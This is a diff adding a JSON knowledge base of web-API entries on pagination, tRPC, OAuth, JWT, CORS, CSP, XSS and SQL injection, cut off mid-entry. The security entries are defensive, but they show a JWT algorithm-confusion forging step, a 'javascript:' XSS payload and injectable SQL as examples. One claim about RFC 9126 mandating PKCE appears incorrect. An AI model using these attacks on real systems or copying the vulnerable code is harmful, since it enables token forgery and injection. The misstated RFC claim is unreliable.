@@ -1,0 +1,521 @@
+[
+  {
+    "type": "answer",
+    "trust": "verified",
+    "title": "REST API cursor-based pagination with Link headers",
+    "body": "Cursor-based pagination outperforms OFFSET pagination for large datasets because it avoids scanning skipped rows. Return cursors as opaque base64 tokens and use RFC 8288 Link headers for discoverability.\n\n```typescript\nimport { Request, Response } from 'express';\n\napp.get('/api/items', async (req: Request, res: Response) => {\n  const cursor = req.query.cursor\n    ? Buffer.from(req.query.cursor as string, 'base64').toString('utf-8')\n    : null;\n  const limit = Math.min(Number(req.query.limit) || 20, 100);\n\n  const items = await db.query(\n    `SELECT * FROM items WHERE ($1::text IS NULL OR id < $1)\n     ORDER BY id DESC LIMIT $2`,\n    [cursor, limit + 1]\n  );\n\n  const hasNext = items.length > limit;\n  const results = hasNext ? items.slice(0, -1) : items;\n  const nextCursor = hasNext\n    ? Buffer.from(results[results.length - 1].id).toString('base64')\n    : null;\n\n  if (nextCursor) {\n    res.set('Link', `</api/items?cursor=${nextCursor}&limit=${limit}>; rel=\"next\"`);\n  }\n  res.json({ data: results, pagination: { nextCursor, hasNext } });\n});\n```\n\nAlways cap the limit parameter server-side to prevent abuse. Encode cursors to prevent clients from crafting arbitrary queries.",
+    "tags": [
+      "rest",
+      "pagination",
+      "cursor-based",
+      "api-design",
+      "link-headers"
+    ]
+  },
+  {
+    "type": "snippet",
+    "trust": "verified",
+    "title": "tRPC v11 router setup with input validation and context",
+    "body": "Complete tRPC v11 router setup with Zod validation, context injection, and error handling for a Next.js App Router project.\n\n```typescript\n// server/trpc.ts\nimport { initTRPC, TRPCError } from '@trpc/server';\nimport { z } from 'zod';\n\ntype Context = { userId: string | null; db: Database };\n\nconst t = initTRPC.context<Context>().create();\n\nconst isAuthed = t.middleware(({ ctx, next }) => {\n  if (!ctx.userId) {\n    throw new TRPCError({ code: 'UNAUTHORIZED' });\n  }\n  return next({ ctx: { ...ctx, userId: ctx.userId } });\n});\n\nexport const publicProcedure = t.procedure;\nexport const protectedProcedure = t.procedure.use(isAuthed);\n\n// server/routers/post.ts\nexport const postRouter = t.router({\n  list: publicProcedure\n    .input(z.object({\n      cursor: z.string().optional(),\n      limit: z.number().min(1).max(50).default(20),\n    }))\n    .query(async ({ input, ctx }) => {\n      const posts = await ctx.db.query.posts.findMany({\n        limit: input.limit + 1,\n        cursor: input.cursor ? { id: input.cursor } : undefined,\n        orderBy: (posts, { desc }) => [desc(posts.createdAt)],\n      });\n      return { posts: posts.slice(0, input.limit) };\n    }),\n});\n```\n\nThe middleware pattern ensures type-safe context narrowing: after `isAuthed`, `ctx.userId` is guaranteed to be `string`, not `string | null`.",
+    "tags": [
+      "trpc",
+      "typescript",
+      "zod",
+      "nextjs",
+      "api-design"
+    ]
+  },
+  {
+    "type": "error",
+    "trust": "verified",
+    "title": "tRPC \u2014 TRPCClientError: No \"query\" procedure on path \"post.list\"",
+    "body": "Full error message:\n```\nTRPCClientError: No \"query\" procedure at path \"post.list\"\n    at TRPCClientError.from (trpc-client.mjs:42:16)\n```\n\nThis error occurs when the client calls a procedure that does not exist on the merged router. Common causes:\n\n1. **Router not merged**: You defined `postRouter` but forgot to add it to the app router.\n```typescript\n// WRONG \u2014 postRouter not included\nexport const appRouter = t.router({ user: userRouter });\n\n// CORRECT\nexport const appRouter = t.router({\n  user: userRouter,\n  post: postRouter,  // must be added here\n});\n```\n\n2. **Type mismatch**: The client-side `AppRouter` type import is stale. Restart your dev server and ensure the type is imported from the server, not a generated file.\n\n3. **Procedure type mismatch**: You defined a `.mutation()` on the server but the client calls `trpc.post.list.useQuery()`. Query calls can only invoke `.query()` procedures.\n\n4. **Case sensitivity**: `Post.list` vs `post.list` \u2014 router keys are case-sensitive.\n\nFix: verify the procedure exists on the router, ensure the app router includes it, and confirm query vs mutation alignment.",
+    "tags": [
+      "trpc",
+      "error",
+      "debugging",
+      "typescript"
+    ]
+  },
+  {
+    "type": "tutorial",
+    "trust": "verified",
+    "title": "GraphQL DataLoader \u2014 batching and caching N+1 queries",
+    "body": "DataLoader solves the N+1 problem in GraphQL resolvers by batching individual loads into a single query per tick of the event loop.\n\n```typescript\nimport DataLoader from 'dataloader';\n\n// Create a loader per request to avoid cross-request caching\nfunction createLoaders(db: Database) {\n  return {\n    userById: new DataLoader<string, User>(async (ids) => {\n      const users = await db.query(\n        `SELECT * FROM users WHERE id = ANY($1)`,\n        [ids]\n      );\n      // CRITICAL: return in same order as input ids\n      const userMap = new Map(users.map(u => [u.id, u]));\n      return ids.map(id => userMap.get(id) ?? new Error(`User ${id} not found`));\n    }),\n  };\n}\n\n// In your resolver\nconst resolvers = {\n  Post: {\n    author: (post, _, { loaders }) => loaders.userById.load(post.authorId),\n  },\n};\n```\n\nKey rules: (1) Always create loaders per-request, never globally \u2014 global loaders serve stale data to other users. (2) The batch function must return results in the exact same order as the input keys. (3) Return `Error` instances for missing keys instead of `null` \u2014 DataLoader uses this to distinguish missing vs intentionally null values. (4) Set `maxBatchSize` if your database has a parameter limit (e.g., PostgreSQL's 65535 parameter cap).",
+    "tags": [
+      "graphql",
+      "dataloader",
+      "n-plus-one",
+      "performance",
+      "batching"
+    ]
+  },
+  {
+    "type": "gotcha",
+    "trust": "verified",
+    "title": "GraphQL DataLoader \u2014 global loader causes cross-request data leaks",
+    "body": "A common mistake is creating DataLoader instances at module level or as singletons. DataLoader caches results by key, so a globally shared loader will serve cached data from User A's request to User B.\n\n```typescript\n// DANGEROUS \u2014 shared across all requests\nconst userLoader = new DataLoader(batchFn);\n\n// Request 1: admin loads user #5 (gets full profile with SSN)\nuserLoader.load('5');\n// Request 2: public user loads user #5 \u2014 gets cached admin-level data!\nuserLoader.load('5');\n```\n\nThe fix: create loaders inside your GraphQL context factory, which runs once per request.\n\n```typescript\nconst server = new ApolloServer({\n  typeDefs,\n  resolvers,\n  context: ({ req }) => {\n    const userId = verifyToken(req.headers.authorization);\n    return {\n      userId,\n      loaders: createLoaders(db), // fresh loaders per request\n    };\n  },\n});\n```\n\nIf you need cross-request caching (e.g., for public catalogs), use a separate caching layer (Redis) and configure DataLoader with `{ cache: false }` to disable its built-in memoization. This separates the batching concern (DataLoader's job) from the caching concern (Redis's job).",
+    "tags": [
+      "graphql",
+      "dataloader",
+      "security",
+      "caching",
+      "gotcha"
+    ]
+  },
+  {
+    "type": "pattern",
+    "trust": "verified",
+    "title": "Webhook idempotency \u2014 preventing duplicate processing",
+    "body": "Webhooks are delivered at-least-once, meaning your handler must be idempotent. Use an idempotency key (usually the event ID) and a persistent store to track processed events.\n\n```typescript\napp.post('/webhooks/stripe', async (req, res) => {\n  const sig = req.headers['stripe-signature'] as string;\n  let event: Stripe.Event;\n\n  try {\n    event = stripe.webhooks.constructEvent(req.body, sig, webhookSecret);\n  } catch (err) {\n    return res.status(400).send(`Webhook signature verification failed`);\n  }\n\n  // Idempotency check \u2014 use a unique constraint on event_id\n  const existing = await db.query(\n    `INSERT INTO webhook_events (event_id, type, processed_at)\n     VALUES ($1, $2, NOW())\n     ON CONFLICT (event_id) DO NOTHING\n     RETURNING event_id`,\n    [event.id, event.type]\n  );\n\n  if (existing.rowCount === 0) {\n    // Already processed \u2014 return 200 so the provider stops retrying\n    return res.status(200).json({ received: true, duplicate: true });\n  }\n\n  await processEvent(event);\n  res.status(200).json({ received: true });\n});\n```\n\nAlways return 200 for duplicates. If you return an error, the webhook provider will retry, creating an infinite loop. Use a database unique constraint rather than a SELECT-then-INSERT to avoid race conditions under concurrent delivery.",
+    "tags": [
+      "webhooks",
+      "idempotency",
+      "stripe",
+      "api-design",
+      "reliability"
+    ]
+  },
+  {
+    "type": "gotcha",
+    "trust": "community",
+    "title": "Webhook replay attacks \u2014 always verify signatures with timing-safe comparison",
+    "body": "Webhook signatures prevent tampering, but a naive string comparison (`===`) is vulnerable to timing attacks. An attacker can determine the correct signature byte-by-byte by measuring response times.\n\n```typescript\nimport { timingSafeEqual, createHmac } from 'crypto';\n\nfunction verifyWebhookSignature(\n  payload: string,\n  signature: string,\n  secret: string\n): boolean {\n  const expected = createHmac('sha256', secret)\n    .update(payload)\n    .digest('hex');\n\n  // WRONG: timing-vulnerable\n  // return signature === expected;\n\n  // CORRECT: constant-time comparison\n  const sigBuffer = Buffer.from(signature, 'hex');\n  const expectedBuffer = Buffer.from(expected, 'hex');\n\n  if (sigBuffer.length !== expectedBuffer.length) return false;\n  return timingSafeEqual(sigBuffer, expectedBuffer);\n}\n```\n\nAdditionally, include a timestamp in the signed payload and reject events older than 5 minutes to prevent replay attacks. Stripe's `constructEvent` handles both concerns automatically \u2014 only implement manual verification when integrating with providers that do not offer an SDK.",
+    "tags": [
+      "webhooks",
+      "security",
+      "hmac",
+      "timing-attack",
+      "crypto"
+    ]
+  },
+  {
+    "type": "tutorial",
+    "trust": "verified",
+    "title": "OAuth 2.0 PKCE flow \u2014 implementation for SPAs and mobile apps",
+    "body": "PKCE (Proof Key for Code Exchange) prevents authorization code interception attacks. It replaces the client secret with a dynamically generated code verifier/challenge pair.\n\n```typescript\nimport crypto from 'crypto';\n\n// Step 1: Generate code verifier and challenge\nfunction generatePKCE() {\n  const verifier = crypto.randomBytes(32).toString('base64url');\n  const challenge = crypto\n    .createHash('sha256')\n    .update(verifier)\n    .digest('base64url');\n  return { verifier, challenge };\n}\n\n// Step 2: Authorization request\nconst { verifier, challenge } = generatePKCE();\n// Store verifier in session/localStorage\nconst authUrl = new URL('https://auth.example.com/authorize');\nauthUrl.searchParams.set('response_type', 'code');\nauthUrl.searchParams.set('client_id', CLIENT_ID);\nauthUrl.searchParams.set('redirect_uri', REDIRECT_URI);\nauthUrl.searchParams.set('code_challenge', challenge);\nauthUrl.searchParams.set('code_challenge_method', 'S256');\nauthUrl.searchParams.set('scope', 'openid profile email');\n\n// Step 3: Token exchange (after receiving auth code)\nconst tokenRes = await fetch('https://auth.example.com/token', {\n  method: 'POST',\n  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },\n  body: new URLSearchParams({\n    grant_type: 'authorization_code',\n    code: authCode,\n    redirect_uri: REDIRECT_URI,\n    client_id: CLIENT_ID,\n    code_verifier: verifier, // proves possession\n  }),\n});\n```\n\nPKCE is now recommended for ALL OAuth clients \u2014 not just public clients. RFC 9126 makes it mandatory for authorization servers.",
+    "tags": [
+      "oauth",
+      "pkce",
+      "authentication",
+      "security",
+      "spa"
+    ]
+  },
+  {
+    "type": "comparison",
+    "trust": "verified",
+    "title": "JWT signing \u2014 RS256 vs HS256 tradeoffs",
+    "body": "HS256 (HMAC-SHA256) uses a symmetric shared secret. RS256 (RSA-SHA256) uses an asymmetric public/private key pair. The choice depends on your architecture.\n\n**HS256**: Single secret signs and verifies. Faster (10x or more). Suitable when the issuer and verifier are the same service. If the secret leaks, attackers can both forge and verify tokens.\n\n```typescript\n// HS256 \u2014 same secret for signing and verification\nimport jwt from 'jsonwebtoken';\nconst token = jwt.sign({ sub: userId }, SECRET, { algorithm: 'HS256', expiresIn: '1h' });\nconst payload = jwt.verify(token, SECRET, { algorithms: ['HS256'] });\n```\n\n**RS256**: Private key signs, public key verifies. Slower but allows distributed verification. Microservices can verify tokens using the public key without ever having the private key. Supports JWKS endpoints for key rotation.\n\n```typescript\n// RS256 \u2014 different keys for signing and verification\nconst token = jwt.sign({ sub: userId }, PRIVATE_KEY, { algorithm: 'RS256', expiresIn: '1h' });\n// Any service with the public key can verify\nconst payload = jwt.verify(token, PUBLIC_KEY, { algorithms: ['RS256'] });\n```\n\nUse HS256 for monoliths and internal services. Use RS256 when tokens cross trust boundaries or when multiple services need to verify without sharing secrets. Always specify `algorithms` in `verify()` to prevent algorithm confusion attacks.",
+    "tags": [
+      "jwt",
+      "rs256",
+      "hs256",
+      "authentication",
+      "cryptography"
+    ]
+  },
+  {
+    "type": "gotcha",
+    "trust": "unverified",
+    "title": "JWT algorithm confusion attack \u2014 always pin the algorithm",
+    "body": "A critical JWT vulnerability: if your server accepts both RS256 and HS256, an attacker can take your public RSA key (which is, by design, public), use it as the HS256 secret, and forge valid tokens.\n\n```typescript\n// VULNERABLE \u2014 does not restrict algorithms\nconst payload = jwt.verify(token, PUBLIC_KEY);\n// Attacker signs: jwt.sign({ admin: true }, PUBLIC_KEY, { algorithm: 'HS256' })\n// Server verifies with PUBLIC_KEY using HS256 \u2014 PASSES!\n\n// SAFE \u2014 pin the algorithm\nconst payload = jwt.verify(token, PUBLIC_KEY, {\n  algorithms: ['RS256'],  // only accept RS256\n});\n```\n\nThis works because the `verify` function, when given a public key string and no algorithm restriction, will try HS256 where the public key becomes the HMAC secret. Since the attacker knows the public key, they can compute a valid HMAC.\n\nDefenses: (1) Always specify `algorithms` array in verify options. (2) Use JWK/JWKS where the key metadata includes the algorithm. (3) Use libraries like `jose` that require explicit algorithm selection. (4) Never accept `alg: \"none\"` \u2014 some libraries historically accepted unsigned tokens when no algorithm was specified.",
+    "tags": [
+      "jwt",
+      "security",
+      "vulnerability",
+      "algorithm-confusion",
+      "authentication"
+    ]
+  },
+  {
+    "type": "answer",
+    "trust": "community",
+    "title": "Secure session management \u2014 cookie settings for production",
+    "body": "A production-ready session cookie configuration must balance security and usability. Here are the critical attributes and why each matters.\n\n```typescript\nimport session from 'express-session';\nimport RedisStore from 'connect-redis';\nimport { createClient } from 'redis';\n\nconst redisClient = createClient({ url: process.env.REDIS_URL });\nawait redisClient.connect();\n\napp.use(session({\n  store: new RedisStore({ client: redisClient }),\n  name: '__Host-sid',  // __Host- prefix enforces Secure + path=/\n  secret: process.env.SESSION_SECRET,\n  resave: false,\n  saveUninitialized: false,\n  cookie: {\n    secure: true,          // HTTPS only\n    httpOnly: true,        // inaccessible to JavaScript\n    sameSite: 'lax',       // CSRF protection, allows top-level nav\n    maxAge: 24 * 60 * 60 * 1000, // 24 hours\n    path: '/',\n    domain: undefined,     // defaults to current domain, no subdomains\n  },\n}));\n```\n\nKey decisions: Use `sameSite: 'lax'` (not `strict`) so sessions survive clicking links from emails. Use `httpOnly: true` always \u2014 there is no legitimate reason for client-side JS to read a session cookie. The `__Host-` prefix is a defense-in-depth mechanism supported by modern browsers that forces `secure=true` and `path=/`.",
+    "tags": [
+      "sessions",
+      "cookies",
+      "security",
+      "redis",
+      "express"
+    ]
+  },
+  {
+    "type": "snippet",
+    "trust": "verified",
+    "title": "Next-Auth v5 (Auth.js) setup with credentials + JWT strategy",
+    "body": "Auth.js v5 configuration for Next.js App Router with a credentials provider, JWT sessions, and role-based access.\n\n```typescript\n// auth.ts\nimport NextAuth from 'next-auth';\nimport Credentials from 'next-auth/providers/credentials';\nimport { z } from 'zod';\nimport bcrypt from 'bcryptjs';\n\nexport const { handlers, signIn, signOut, auth } = NextAuth({\n  providers: [\n    Credentials({\n      credentials: {\n        email: { type: 'email' },\n        password: { type: 'password' },\n      },\n      async authorize(credentials) {\n        const parsed = z.object({\n          email: z.string().email(),\n          password: z.string().min(8),\n        }).safeParse(credentials);\n        if (!parsed.success) return null;\n\n        const user = await db.query.users.findFirst({\n          where: eq(users.email, parsed.data.email),\n        });\n        if (!user) return null;\n\n        const valid = await bcrypt.compare(parsed.data.password, user.passwordHash);\n        return valid ? { id: user.id, email: user.email, role: user.role } : null;\n      },\n    }),\n  ],\n  session: { strategy: 'jwt' },\n  callbacks: {\n    jwt({ token, user }) {\n      if (user) token.role = user.role;\n      return token;\n    },\n    session({ session, token }) {\n      session.user.role = token.role as string;\n      return session;\n    },\n  },\n});\n```\n\nAlways validate credentials with Zod before querying the database. Use bcrypt or argon2 for password hashing \u2014 never SHA-256 or MD5.",
+    "tags": [
+      "next-auth",
+      "auth-js",
+      "nextjs",
+      "credentials",
+      "jwt"
+    ]
+  },
+  {
+    "type": "error",
+    "trust": "community",
+    "title": "Auth.js \u2014 [auth][error] CallbackRouteError: OAUTH_CALLBACK_ERROR",
+    "body": "Full error message:\n```\n[auth][error] CallbackRouteError: Read more at https://errors.authjs.dev#callbackrouteerror\nCause: OAuthCallbackError: OAUTH_CALLBACK_ERROR\n  checks: [\"pkce\",\"state\"]\n```\n\nThis error appears when the OAuth callback fails state or PKCE validation. Root causes:\n\n1. **Mismatched redirect URI**: The `NEXTAUTH_URL` env var does not match the callback URL registered with the OAuth provider. In production, this must be your canonical domain (e.g., `https://app.example.com`), not `http://localhost:3000`.\n\n2. **Missing cookies**: The state/PKCE values are stored in cookies. If `sameSite` settings are too strict or the cookie domain is wrong, the browser won't send them back on the callback redirect.\n\n3. **Proxy stripping headers**: If behind a reverse proxy (nginx, Cloudflare), ensure `X-Forwarded-Proto` and `X-Forwarded-Host` are passed through. Set `trustHost: true` in your Auth.js config.\n\n4. **Clock skew**: The state parameter contains a timestamp. If your server clock is significantly off, state validation fails.\n\nQuick debug: Set `AUTH_DEBUG=true` in your environment to see the full error chain. Check that `NEXTAUTH_URL` exactly matches the registered redirect URI, including trailing slashes.",
+    "tags": [
+      "auth-js",
+      "oauth",
+      "error",
+      "debugging",
+      "nextjs"
+    ]
+  },
+  {
+    "type": "config",
+    "trust": "verified",
+    "title": "CORS configuration \u2014 secure defaults for API servers",
+    "body": "A restrictive CORS configuration that covers common needs without opening security holes.\n\n```typescript\nimport cors from 'cors';\n\nconst allowedOrigins = [\n  'https://app.example.com',\n  'https://staging.example.com',\n];\n\nif (process.env.NODE_ENV === 'development') {\n  allowedOrigins.push('http://localhost:3000');\n}\n\napp.use(cors({\n  origin: (origin, callback) => {\n    // Allow requests with no origin (mobile apps, curl, server-to-server)\n    if (!origin) return callback(null, true);\n    if (allowedOrigins.includes(origin)) {\n      return callback(null, true);\n    }\n    callback(new Error(`Origin ${origin} not allowed by CORS`));\n  },\n  credentials: true,         // allow cookies/auth headers\n  methods: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH'],\n  allowedHeaders: ['Content-Type', 'Authorization', 'X-Request-ID'],\n  exposedHeaders: ['X-Total-Count', 'Link'],  // pagination headers\n  maxAge: 86400,             // preflight cache: 24 hours\n}));\n```\n\nNever use `origin: '*'` with `credentials: true` \u2014 browsers block this combination. Never reflect the `Origin` header back without validation, as that effectively disables CORS for any attacker-controlled domain. Always whitelist specific origins.",
+    "tags": [
+      "cors",
+      "security",
+      "express",
+      "api-design",
+      "headers"
+    ]
+  },
+  {
+    "type": "config",
+    "trust": "verified",
+    "title": "Content Security Policy (CSP) headers \u2014 production configuration",
+    "body": "A strict CSP that prevents XSS, clickjacking, and data exfiltration. Start restrictive and loosen as needed.\n\n```typescript\nimport helmet from 'helmet';\nimport crypto from 'crypto';\n\napp.use((req, res, next) => {\n  res.locals.nonce = crypto.randomBytes(16).toString('base64');\n  next();\n});\n\napp.use(helmet({\n  contentSecurityPolicy: {\n    directives: {\n      defaultSrc: [\"'self'\"],\n      scriptSrc: [\n        \"'self'\",\n        (req, res) => `'nonce-${res.locals.nonce}'`,\n      ],\n      styleSrc: [\"'self'\", \"'unsafe-inline'\"],  // needed for CSS-in-JS\n      imgSrc: [\"'self'\", 'data:', 'https://cdn.example.com'],\n      connectSrc: [\"'self'\", 'https://api.example.com'],\n      fontSrc: [\"'self'\", 'https://fonts.gstatic.com'],\n      objectSrc: [\"'none'\"],\n      frameAncestors: [\"'none'\"],  // replaces X-Frame-Options\n      baseUri: [\"'self'\"],\n      formAction: [\"'self'\"],\n      upgradeInsecureRequests: [],\n    },\n  },\n}));\n```\n\nUse nonces instead of `unsafe-inline` for scripts. Each response gets a unique nonce, and only `<script nonce=\"...\">` tags with a matching nonce execute. Deploy in `Content-Security-Policy-Report-Only` mode first to catch violations without breaking the site.",
+    "tags": [
+      "csp",
+      "security",
+      "headers",
+      "xss-prevention",
+      "helmet"
+    ]
+  },
+  {
+    "type": "answer",
+    "trust": "community",
+    "title": "XSS prevention in React \u2014 dangerouslySetInnerHTML and common escape hatches",
+    "body": "React auto-escapes JSX expressions, but several patterns bypass this protection and introduce XSS vulnerabilities.\n\n**Known dangerous patterns:**\n\n```typescript\n// 1. dangerouslySetInnerHTML \u2014 name says it all\n<div dangerouslySetInnerHTML={{ __html: userInput }} />\n\n// 2. href with user-controlled URLs\n<a href={userInput}>Click</a>  // javascript:alert(1) works!\n\n// 3. Passing user input as component props to third-party libraries\n<Markdown content={userInput} />  // depends on library sanitization\n```\n\n**Safe patterns:**\n\n```typescript\nimport DOMPurify from 'dompurify';\n\n// Sanitize HTML before rendering\n<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userInput) }} />\n\n// Validate URLs against an allowlist of protocols\nfunction SafeLink({ href, children }) {\n  const url = new URL(href, window.location.origin);\n  if (!['http:', 'https:', 'mailto:'].includes(url.protocol)) {\n    return <span>{children}</span>;  // render as plain text\n  }\n  return <a href={href} rel=\"noopener noreferrer\">{children}</a>;\n}\n```\n\nAlways use DOMPurify for user-generated HTML. Never trust `href`, `src`, or `action` attributes with user input. Add `rel=\"noopener noreferrer\"` to all external links.",
+    "tags": [
+      "xss",
+      "react",
+      "security",
+      "sanitization",
+      "dompurify"
+    ]
+  },
+  {
+    "type": "pattern",
+    "trust": "community",
+    "title": "XSS prevention \u2014 output encoding strategy by context",
+    "body": "XSS prevention requires different encoding depending on where user data is inserted. Using the wrong encoding for the context still leaves you vulnerable.\n\n**HTML body context**: HTML-entity encode `< > & \" '`\n```typescript\nfunction escapeHTML(str: string): string {\n  return str\n    .replace(/&/g, '&amp;')\n    .replace(/</g, '&lt;')\n    .replace(/>/g, '&gt;')\n    .replace(/\"/g, '&quot;')\n    .replace(/'/g, '&#x27;');\n}\n```\n\n**HTML attribute context**: Same as HTML body, but always quote attributes. `<div class=${val}>` is vulnerable even with encoding.\n\n**JavaScript context**: JSON.stringify handles encoding, but never inject into `<script>` tags without a nonce. Prefer data attributes: `<div data-config=\"${escapeHTML(JSON.stringify(config))}\">`.\n\n**URL parameter context**: Use `encodeURIComponent()`, never manual encoding.\n\n**CSS context**: Avoid injecting user data into CSS entirely. If unavoidable, allowlist specific property values.\n\nFramework protections: React escapes JSX automatically. EJS does NOT escape `<%- %>` (only `<%= %>`). Handlebars escapes `{{}}` but not `{{{}}}`.\n\nLayer your defenses: output encoding + CSP headers + HttpOnly cookies. No single measure is sufficient.",
+    "tags": [
+      "xss",
+      "security",
+      "encoding",
+      "output-encoding",
+      "defense-in-depth"
+    ]
+  },
+  {
+    "type": "snippet",
+    "trust": "verified",
+    "title": "SQL injection prevention \u2014 parameterized queries with Drizzle and raw SQL",
+    "body": "SQL injection remains the most dangerous web vulnerability. Always use parameterized queries, never string interpolation.\n\n```typescript\n// VULNERABLE \u2014 string interpolation\nconst users = await db.execute(\n  `SELECT * FROM users WHERE email = '${email}'` // SQL injection!\n);\n\n// SAFE \u2014 Drizzle ORM (parameterized automatically)\nconst users = await db.select()\n  .from(usersTable)\n  .where(eq(usersTable.email, email));\n\n// SAFE \u2014 raw SQL with parameters (Drizzle sql template tag)\nimport { sql } from 'drizzle-orm';\nconst users = await db.execute(\n  sql`SELECT * FROM users WHERE email = ${email}`\n);\n\n// SAFE \u2014 node-postgres with parameterized query\nconst { rows } = await pool.query(\n  'SELECT * FROM users WHERE email = $1 AND status = $2',\n  [email, 'active']\n);\n```\n\nEdge cases that still allow injection:\n- Dynamic column names: `ORDER BY ${column}` cannot be parameterized. Validate against an allowlist: `if (!['name', 'created_at'].includes(column)) throw new Error('Invalid column');`\n- `LIKE` queries: Escape `%` and `_` in user input before passing to the parameter: `input.replace(/[%_]/g, '\\\\$&')`.\n- `IN` clauses: Use `ANY($1)` with an array parameter instead of dynamically building `IN (?, ?, ?)`.",
+    "tags": [
+      "sql-injection",
+      "security",
+      "drizzle",
+      "postgresql",
+      "parameterized-queries"
+    ]
+  },
+  {
+    "type": "gotcha",
+    "trust": "community",
+    "title": "SQL injection in ORDER BY clauses \u2014 cannot use parameterized queries",
+    "body": "Column names and sort directions in ORDER BY cannot be parameterized in SQL. Most drivers will silently treat the parameter as a string literal, producing incorrect queries instead of errors.\n\n```typescript\n// This does NOT work as expected \u2014 PostgreSQL treats $1 as a string literal\nawait pool.query('SELECT * FROM users ORDER BY $1 $2', [column, direction]);\n// Produces: ORDER BY 'name' 'ASC' \u2014 which is a syntax error or wrong result\n\n// CORRECT \u2014 validate against an allowlist and interpolate safely\nconst ALLOWED_COLUMNS = ['name', 'created_at', 'email'] as const;\nconst ALLOWED_DIRS = ['ASC', 'DESC'] as const;\n\nfunction buildOrderBy(column: string, dir: string): string {\n  if (!ALLOWED_COLUMNS.includes(column as any)) {\n    throw new Error(`Invalid sort column: ${column}`);\n  }\n  if (!ALLOWED_DIRS.includes(dir.toUpperCase() as any)) {\n    throw new Error(`Invalid sort direction: ${dir}`);\n  }\n  return `ORDER BY \"${column}\" ${dir.toUpperCase()}`;\n}\n\n// With Drizzle \u2014 type-safe by design\nimport { asc, desc } from 'drizzle-orm';\nconst orderFn = direction === 'desc' ? desc : asc;\nconst results = await db.select().from(users).orderBy(orderFn(users[column]));\n```\n\nThis also applies to table names, schema names, and any other SQL identifier. ORMs handle this automatically, which is one of their key security benefits.",
+    "tags": [
+      "sql-injection",
+      "security",
+      "gotcha",
+      "order-by",
+      "postgresql"
+    ]
+  },
+  {
+    "type": "snippet",
+    "trust": "community",
+    "title": "API key hashing \u2014 storing keys securely with SHA-256 prefix lookup",
+    "body": "API keys should be hashed before storage, just like passwords. But unlike passwords, you need fast lookup \u2014 so use SHA-256 (not bcrypt) with a prefix for identification.\n\n```typescript\nimport crypto from 'crypto';\n\n// Key generation \u2014 show full key to user ONCE\nfunction generateApiKey(): { key: string; hash: string; prefix: string } {\n  const key = `sk_live_${crypto.randomBytes(32).toString('base64url')}`;\n  const hash = crypto.createHash('sha256').update(key).digest('hex');\n  const prefix = key.slice(0, 12); // 'sk_live_xxxx' for display\n  return { key, hash, prefix };\n}\n\n// Storage \u2014 store hash and prefix, never the full key\nawait db.insert(apiKeys).values({\n  hash: generated.hash,\n  prefix: generated.prefix,\n  userId: user.id,\n  scopes: ['read:nodes', 'write:nodes'],\n  expiresAt: new Date(Date.now() + 90 * 24 * 60 * 60 * 1000),\n});\n\n// Verification \u2014 hash incoming key, compare to stored hash\nasync function verifyApiKey(key: string) {\n  const hash = crypto.createHash('sha256').update(key).digest('hex');\n  const record = await db.query.apiKeys.findFirst({\n    where: eq(apiKeys.hash, hash),\n  });\n  if (!record || record.expiresAt < new Date()) return null;\n  return record;\n}\n```\n\nWhy SHA-256 and not bcrypt? API keys are high-entropy random strings (256 bits), immune to dictionary attacks. Bcrypt's slow hashing adds latency to every API call without security benefit. Passwords are low-entropy (human-chosen), which is why they need bcrypt.",
+    "tags": [
+      "api-keys",
+      "hashing",
+      "security",
+      "sha256",
+      "authentication"
+    ]
+  },
+  {
+    "type": "gotcha",
+    "trust": "community",
+    "title": "API key hashing \u2014 do NOT use bcrypt for API keys",
+    "body": "A common mistake is applying password-hashing best practices to API keys. Bcrypt and argon2 are designed for low-entropy passwords, where slow hashing prevents brute-force attacks. API keys are high-entropy random strings.\n\nConsider: a 32-byte random API key has 256 bits of entropy. An attacker guessing at 1 billion hashes/second would need 3.7 x 10^59 years. Bcrypt's slowness adds zero practical security but adds 100-300ms latency per API request.\n\n```typescript\n// BAD \u2014 200ms+ per API request for no security benefit\nconst isValid = await bcrypt.compare(incomingKey, storedHash);\n\n// GOOD \u2014 microseconds, equally secure for high-entropy keys\nconst incomingHash = crypto.createHash('sha256').update(incomingKey).digest('hex');\nconst isValid = incomingHash === storedHash;\n```\n\nUse SHA-256 for API keys. Use bcrypt/argon2 for passwords. The distinction is entropy: passwords have ~30-50 bits (guessable), API keys have ~256 bits (not guessable). If you use bcrypt for API keys in a high-throughput service, you are essentially DoS-ing yourself \u2014 each concurrent request ties up CPU for hundreds of milliseconds.\n\nOne caveat: if your API keys are short or user-chosen (they should not be), then bcrypt is appropriate.",
+    "tags": [
+      "api-keys",
+      "bcrypt",
+      "security",
+      "performance",
+      "gotcha"
+    ]
+  },
+  {
+    "type": "snippet",
+    "trust": "verified",
+    "title": "Zod input validation \u2014 comprehensive API request schema",
+    "body": "Zod schemas for validating API input with custom error messages, transformations, and nested objects.\n\n```typescript\nimport { z } from 'zod';\n\nconst CreateUserSchema = z.object({\n  email: z.string()\n    .email('Invalid email format')\n    .toLowerCase()\n    .max(255),\n  password: z.string()\n    .min(8, 'Password must be at least 8 characters')\n    .max(128)\n    .regex(/[A-Z]/, 'Must contain an uppercase letter')\n    .regex(/[0-9]/, 'Must contain a number'),\n  name: z.string().trim().min(1).max(100),\n  role: z.enum(['user', 'admin']).default('user'),\n  metadata: z.record(z.string(), z.unknown()).optional(),\n  tags: z.array(z.string().max(50)).max(10).default([]),\n});\n\n// Express middleware\nfunction validate<T extends z.ZodSchema>(schema: T) {\n  return (req: Request, res: Response, next: NextFunction) => {\n    const result = schema.safeParse(req.body);\n    if (!result.success) {\n      return res.status(400).json({\n        error: 'Validation failed',\n        issues: result.error.issues.map(i => ({\n          path: i.path.join('.'),\n          message: i.message,\n        })),\n      });\n    }\n    req.body = result.data; // replaces body with parsed + transformed data\n    next();\n  };\n}\n\napp.post('/users', validate(CreateUserSchema), createUserHandler);\n```\n\nKey practices: always use `safeParse` (not `parse`) to avoid uncaught exceptions. Apply `.trim()` and `.toLowerCase()` as transformations. Set reasonable `max()` limits on all strings and arrays to prevent memory exhaustion attacks.",
+    "tags": [
+      "zod",
+      "validation",
+      "typescript",
+      "express",
+      "api-design"
+    ]
+  },
+  {
+    "type": "pattern",
+    "trust": "community",
+    "title": "Zod \u2014 reusable validation patterns for common API fields",
